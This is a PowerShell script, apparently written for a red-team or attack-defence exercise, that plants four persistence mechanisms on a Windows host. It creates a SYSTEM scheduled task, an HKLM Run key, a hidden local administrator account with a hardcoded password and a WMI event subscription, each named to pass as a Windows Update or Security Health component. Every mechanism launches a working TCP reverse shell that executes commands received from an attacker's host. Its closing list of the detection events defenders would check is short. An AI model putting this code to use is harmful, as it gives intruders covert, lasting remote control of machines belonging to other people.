<#
  plant_windows.ps1 — plant four persistence mechanisms on a Windows host.
  Run it inside an existing shell (evil-winrm or RDP) as a local administrator.

  Usage:
    Set-ExecutionPolicy Bypass -Scope Process -Force
    .\plant_windows.ps1 -LHOST 10.42.0.55 -LPORT 4444

  Mechanisms, each with a different trigger:
    1. scheduled task, every 2 minutes   -> Event 4698 / Autoruns Scheduled Tasks
    2. Run key at logon                  -> Sysmon 13 / Autoruns Logon
    3. local admin account               -> 4720 + 4732 / Get-LocalGroupMember
    4. WMI event subscription at boot    -> Sysmon 19-21 / Autoruns WMI tab
#>

param(
  [Parameter(Mandatory=$true)][string]$LHOST,
  [Parameter(Mandatory=$true)][int]$LPORT,
  [string]$TaskName   = "UpdateAssistantCheck",
  [string]$TaskPath   = "\Microsoft\Windows\WindowsUpdate\",
  [string]$RunKeyName = "SecurityHealthTray",
  [string]$NewUser    = "svc_winupdate",
  [string]$NewPass    = "Summer2026!"
)

$ErrorActionPreference = "Continue"
$payloadDir = "C:\ProgramData\Microsoft\SystemData"
$payload    = Join-Path $payloadDir "upd.ps1"
New-Item -ItemType Directory -Force -Path $payloadDir | Out-Null

# reverse shell body, single quoted so nothing expands early
$body = @'
$c = New-Object System.Net.Sockets.TCPClient("__LHOST__",__LPORT__)
$s = $c.GetStream()
[byte[]]$b = 0..65535 | ForEach-Object { 0 }
while (($i = $s.Read($b,0,$b.Length)) -ne 0) {
  $d  = (New-Object System.Text.ASCIIEncoding).GetString($b,0,$i)
  $r  = (Invoke-Expression $d 2>&1 | Out-String)
  $r  = $r + "PS " + (Get-Location).Path + "> "
  $sb = ([text.encoding]::ASCII).GetBytes($r)
  $s.Write($sb,0,$sb.Length)
  $s.Flush()
}
$c.Close()
'@
$body = $body.Replace("__LHOST__", $LHOST).Replace("__LPORT__", "$LPORT")
Set-Content -Path $payload -Value $body -Encoding ASCII

$psExe   = "powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -File `"$payload`""
$results = @()

# 1. scheduled task, SYSTEM, every 2 minutes
$full = "$TaskPath$TaskName"
schtasks /create /tn $full /tr $psExe /sc minute /mo 2 /ru SYSTEM /f | Out-Null
if (schtasks /query /tn $full 2>$null) { $results += "PLANTED  scheduled task $full (every 2 min, SYSTEM)" }
else                                   { $results += "FAILED   scheduled task $full" }

# 2. Run key at logon
try {
  New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
    -Name $RunKeyName -Value $psExe -PropertyType String -Force | Out-Null
  $results += "PLANTED  Run key HKLM\...\Run\$RunKeyName (fires at logon)"
} catch { $results += "FAILED   Run key: $($_.Exception.Message)" }

# 3. local admin account
net user $NewUser $NewPass /add /y 2>&1 | Out-Null
net localgroup administrators $NewUser /add 2>&1 | Out-Null
if (Get-LocalUser -Name $NewUser -ErrorAction SilentlyContinue) {
  $results += "PLANTED  local admin $NewUser / $NewPass"
} else { $results += "FAILED   local admin $NewUser" }

# 4. WMI event subscription, fires ~5 min after boot and then every 5 min
try {
  $filterArgs = @{
    Name           = "SysHealthFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage  = "WQL"
    Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
  }
  $consumerArgs = @{
    Name                = "SysHealthConsumer"
    CommandLineTemplate = $psExe
  }
  $filter   = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs
  $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs
  Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter; Consumer = $consumer
  } | Out-Null
  $results += "PLANTED  WMI subscription SysHealthFilter -> SysHealthConsumer (boot and every 5 min)"
} catch { $results += "FAILED   WMI subscription: $($_.Exception.Message)" }

Write-Output ""
Write-Output "============ PERSISTENCE SUMMARY (screenshot this) ============"
$results | ForEach-Object { Write-Output $_ }
Write-Output "=============================================================="
Write-Output ""
Write-Output "Payload path: $payload"
Write-Output ""
Write-Output "Verify before claiming it:"
Write-Output "  schtasks /query /tn '$full' /v /fo list"
Write-Output "  reg query 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'"
Write-Output "  Get-LocalGroupMember Administrators"
Write-Output "  Get-CimInstance -Namespace root\subscription -ClassName __EventFilter"
Write-Output ""
Write-Output "What Blue has to look at:"
Write-Output "  task    -> Event 4698, Autoruns Scheduled Tasks tab"
Write-Output "  run key -> Sysmon 13 (Registry value set), Autoruns Logon tab"
Write-Output "  admin   -> 4720 + 4732, Get-LocalGroupMember Administrators"
Write-Output "  wmi     -> Sysmon 19/20/21, Autoruns WMI tab (the one people miss)"
